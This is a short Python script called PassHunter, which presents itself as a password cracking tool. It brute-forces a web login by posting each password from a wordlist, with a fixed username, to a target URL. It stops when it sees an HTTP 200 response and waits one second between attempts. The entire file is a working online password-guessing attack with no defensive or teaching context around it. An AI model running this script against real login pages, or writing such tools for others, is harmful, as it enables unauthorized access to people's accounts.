import requests
import argparse
import time

def attempt_login(url, username, password):
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    return response.status_code

def main():
    parser = argparse.ArgumentParser(description='PassHunter: A password cracking tool.')
    parser.add_argument('url', help='The URL to target (e.g., https://example.com/login)')
    parser.add_argument('username', help='The username to use for login attempts')
    parser.add_argument('password_list', help='Path to the password list file')

    args = parser.parse_args()

    with open(args.password_list, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        print(f'Trying password: {password}')
        status_code = attempt_login(args.url, args.username, password)
        
        if status_code == 200:  # Adjust according to the expected success code
            print(f'Password found: {password}')
            break
        time.sleep(1)  # Optional: to avoid rapid requests

if __name__ == '__main__':
    main()
